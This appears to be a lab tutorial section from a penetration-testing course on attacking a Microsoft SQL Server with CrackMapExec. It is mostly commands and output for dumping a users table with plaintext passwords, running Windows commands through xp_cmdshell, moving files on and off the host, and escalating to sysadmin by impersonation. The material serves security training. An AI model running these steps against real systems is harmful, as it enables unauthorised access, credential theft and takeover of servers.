# MSSQL Enumeration and Attacks

Finding an MSSQL server is very interesting because databases commonly contain information we can use to advance our offensive operations and gain more access. We may also gain access to sensitive data, which is the goal of our assessment. Additionally, we can execute operating system commands through an MSSQL database using the feature [xp\_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16).

As we discussed in the [Password Spraying](https://academy.hackthebox.com/module/84/section/802) section, we can authenticate to SQL with three different types of user accounts. It's also essential to consider what privileges we have on the database and which database we have access to and confirm if we are the database dba (database admin) user.

When working with databases, we will typically perform two operations:

* Execute SQL Queries
* Execute Windows Commands

***

## Execute SQL Queries

A SQL query allows us to interact with the database. We can retrieve information or add data to the database tables. We can also use the different operational functionalities of the management and administration of the database. Once we get an account, we can perform a SQL query using the option `-q`.

### **SQL Query to Get All Database Names**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
MSSQL       10.129.203.121  1433   DC01             name
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------------------------------------------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             master
MSSQL       10.129.203.121  1433   DC01             tempdb
MSSQL       10.129.203.121  1433   DC01             model
MSSQL       10.129.203.121  1433   DC01             msdb
MSSQL       10.129.203.121  1433   DC01             core_app
MSSQL       10.129.203.121  1433   DC01             core_business
```

We can also use the option `--local-auth` to specify an MSSQL user. If we don't select this option, a domain account will be used instead.

### **SQL Queries**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT name FROM master.dbo.sysdatabases" 

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             name
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------------------------------------------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             master
MSSQL       10.129.203.121  1433   DC01             tempdb
MSSQL       10.129.203.121  1433   DC01             model
MSSQL       10.129.203.121  1433   DC01             msdb
MSSQL       10.129.203.121  1433   DC01             core_app
MSSQL       10.129.203.121  1433   DC01             core_business
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES" 
MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             table_name
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------------------------------------------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             tbl_users
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users" 

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             id_user
MSSQL       10.129.203.121  1433   DC01             name
MSSQL       10.129.203.121  1433   DC01             lastname
MSSQL       10.129.203.121  1433   DC01             username
MSSQL       10.129.203.121  1433   DC01             password
MSSQL       10.129.203.121  1433   DC01             -----------
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             1
MSSQL       10.129.203.121  1433   DC01             b'Josh'
MSSQL       10.129.203.121  1433   DC01             b'Matt'
MSSQL       10.129.203.121  1433   DC01             b'josematt'
MSSQL       10.129.203.121  1433   DC01             b'Testing123'
MSSQL       10.129.203.121  1433   DC01             2
MSSQL       10.129.203.121  1433   DC01             b'Elie'
MSSQL       10.129.203.121  1433   DC01             b'Cart'
MSSQL       10.129.203.121  1433   DC01             b'eliecart'
MSSQL       10.129.203.121  1433   DC01             b'Motor999'
```

We performed some database queries to list databases, tables, and content. To learn more about how to enumerate databases using SQL queries, we can read the section [Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169) from [Attacking Common Services](https://academy.hackthebox.com/module/details/116) module.

***

## Executing Windows Commands

When we find an account, CrackMapExec will automatically check if the user is a DBA (Database Administrator) account or not. If we notice the output `Pwn3d!`, the user is a Database Administrator. Users with DBA privileges can access, modify, or delete a database object and grant rights to other users. This user can perform any action against the database.

### **Authenticating with a DBA Account**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
```

MSSQL has an [extended stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows us to execute system commands using SQL. A DBA account has the privileges to enable the features needed to execute Windows operating system commands.

To execute a Windows command, we need to use the option `-x` followed by the command we want to run:

### **Executing Windows Commands**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x whoami

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             inlanefreight\svc_mssql
```

{% hint style="info" %}
**Note:** Being able to execute Windows commands via MSSQL doesn't mean we are local administrators on the Windows machine. We can elevate our privileges or use this access to get more information about the target machine.
{% endhint %}

***

## Transfering Files via MSSQL

MSSQL allows us to download and upload files using [OPENROWSET (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql) and [Ole Automation Procedures Server Configuration Options](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) respectively. CrackMapExec incorporates those options with `--put-file` and `--get-file`.

To upload a file to our target machine, we can use the option `--put-file` followed by the local file we want to upload and the destination directory.

### **Upload File**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             [*] Copy /etc/passwd to C:/Users/Public/passwd
MSSQL       10.129.203.121  1433   DC01             [*] Size is 3456 bytes
MSSQL       10.129.203.121  1433   DC01             [+] File has been uploaded on the remote machine
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             Volume in drive C has no label.
MSSQL       10.129.203.121  1433   DC01             Volume Serial Number is B8B3-0D72
MSSQL       10.129.203.121  1433   DC01             Directory of c:\Users\Public
MSSQL       10.129.203.121  1433   DC01             12/01/2022  04:22 AM    <DIR>          .
MSSQL       10.129.203.121  1433   DC01             12/01/2022  04:22 AM    <DIR>          ..
MSSQL       10.129.203.121  1433   DC01             10/06/2021  02:38 PM    <DIR>          Documents
MSSQL       10.129.203.121  1433   DC01             09/15/2018  01:19 AM    <DIR>          Downloads
MSSQL       10.129.203.121  1433   DC01             09/15/2018  01:19 AM    <DIR>          Music
MSSQL       10.129.203.121  1433   DC01             12/01/2022  04:22 AM             3,456 passwd
MSSQL       10.129.203.121  1433   DC01             09/15/2018  01:19 AM    <DIR>          Pictures
MSSQL       10.129.203.121  1433   DC01             09/15/2018  01:19 AM    <DIR>          Videos
MSSQL       10.129.203.121  1433   DC01             1 File(s)          3,456 bytes
MSSQL       10.129.203.121  1433   DC01             7 Dir(s)  10,588,659,712 bytes free
```

To download a file, we need to use the `--get-file` option followed by the file's path and set an output file name.

### **Download a File from the Target Machine via MSSQL**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             [*] Copy C:/Windows/System32/drivers/etc/hosts to hosts
MSSQL       10.129.203.121  1433   DC01             [+] File C:/Windows/System32/drivers/etc/hosts was transferred to hosts
```

```shell-session
$ cat hosts 
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.

<SNIP>
```

***

## SQL Privilege Escalation Module

CrackMapExec includes a couple of modules for MSSQL, one of them is `mssql_priv`, which enumerates and exploits MSSQL privileges to attempt to escalate from a standard user to a sysadmin. To achieve this, this module enumerates two (2) different privilege escalation vectors in MSSQL `EXECUTE AS LOGIN` and `db_owner role`. The module has three options `enum_privs` to list privileges (default), `privesc` to escalate privileges, and `rollback` to return the user to its original state. Let's see it in action. In the following example, the user `INLANEFREIGHT\robert` has the privilege to impersonate `julio` who is a sysadmin user.

### **MSSQL Privilege Escalation**

```shell-session
$ crackmapexec mssql -M mssql_priv --options

[*] mssql_priv module options:

        ACTION    Specifies the action to perform:
            - enum_priv (default)
            - privesc
            - rollback (remove sysadmin privilege)
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
MSSQL_PR... 10.129.203.121  1433   DC01             [+] INLANEFREIGHT\robert can impersonate julio (sysadmin)
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
MSSQL_PR... 10.129.203.121  1433   DC01             [+] INLANEFREIGHT\robert can impersonate julio (sysadmin)
MSSQL_PR... 10.129.203.121  1433   DC01             [+] INLANEFREIGHT\robert is now a sysadmin! (Pwn3d!)
```

As a sysadmin user, we can now execute commands. Let's do this and then roll back our privileges to their original state:

### **Executing Commands and Rolling Back Privileges**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL       10.129.203.121  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.203.121  1433   DC01             --------------------------------------------------------------------------------
MSSQL       10.129.203.121  1433   DC01             inlanefreight\svc_mssql
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL_PR... 10.129.203.121  1433   DC01             [+] sysadmin role removed
```

```shell-session
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\robert:Inlanefreight01!
```

{% hint style="info" %}
**Note:** To test the module with the users we have, it is necessary to try them one by one since the multi-user functionality with `--no-bruteforce` and `--continue-on-success` does not support testing a module with multiple accounts at the same time.
{% endhint %}

